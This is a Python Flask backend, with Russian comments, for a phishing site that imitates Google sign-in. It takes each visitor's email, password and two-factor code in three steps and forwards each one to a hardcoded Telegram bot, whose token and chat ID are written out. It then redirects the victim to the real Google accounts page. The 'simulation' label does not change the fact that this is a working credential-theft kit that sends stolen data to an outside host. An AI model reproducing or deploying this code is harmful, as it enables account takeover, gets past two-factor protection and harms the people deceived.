from flask import Flask, render_template, request, jsonify
import urllib.request
import urllib.parse
import json

app = Flask(__name__)

# Укажите токен вашего бота и ваш Chat ID
TELEGRAM_BOT_TOKEN = '9047680377:AAEunADiycNSHAqrIs9kB9pKLcrTzvNf9o8'
CHAT_ID = '6713232176'

def send_to_telegram(text):
    if TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN':
        return
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': text}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        urllib.request.urlopen(req)
    except Exception as e:
        print(f'Telegram error: {e}')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/step1', methods=['POST'])
def step1():
    data = request.json
    email = data.get('email')
    print(f'[+] Шаг 1 (Email получен): {email}')
    send_to_telegram(f'📌 Google Auth Simulation\n📧 Email: {email}')
    return jsonify({'status': 'success', 'next_step': 'password'})

@app.route('/api/step2', methods=['POST'])
def step2():
    data = request.json
    password = data.get('password')
    print(f'[+] Шаг 2 (Пароль получен): {password}')
    send_to_telegram(f'📌 Google Auth Simulation\n🔑 Password: {password}')
    return jsonify({'status': 'success', 'next_step': '2fa'})

@app.route('/api/step3', methods=['POST'])
def step3():
    data = request.json
    code = data.get('code')
    print(f'[+] Шаг 3 (2FA код получен): {code}')
    send_to_telegram(f'📌 Google Auth Simulation\n🛡️ 2FA Code: {code}')
    return jsonify({'status': 'success', 'redirect': 'https://accounts.google.com'})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001, debug=True)
